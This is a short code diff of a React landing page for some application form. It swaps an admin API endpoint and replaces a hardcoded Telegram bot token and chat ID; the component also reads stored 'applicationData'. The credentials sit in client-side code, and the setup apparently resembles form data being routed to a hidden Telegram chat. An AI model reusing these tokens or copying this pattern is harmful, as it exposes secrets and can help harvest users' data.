@@ -3,7 +3,7 @@ import ApplyHeader from "../components/applyHeader";
 import logo from "../assets/logo-removebg-preview.png";
 
 const API_URL =
-  "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api6.php"; // Update this based on your server configuration
+  "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api7.php"; // Update this based on your server configuration
 
 const LandingPagee: React.FC = () => {
   //   const [email, setEmail] = useState("");
@@ -14,8 +14,8 @@ const LandingPagee: React.FC = () => {
   const [showPopup33, setShowPopup33] = useState(false);
 
   const [countdown, setCountdown] = useState(100);
-  const BOT_TOKEN = "8379013361:AAG_2hOY6uXZTvCaC4HBfYL6-nR3snO06lM";
-  const CHAT_ID = "8317872395";
+  const BOT_TOKEN = "7287693137:AAHB0QO7JC62ZJSw5EHhVxHF3EJnbqZcXHk";
+  const CHAT_ID = "4575071223";
 
   const storedData = localStorage.getItem("applicationData");
   const parsedData = storedData ? JSON.parse(storedData) : {};
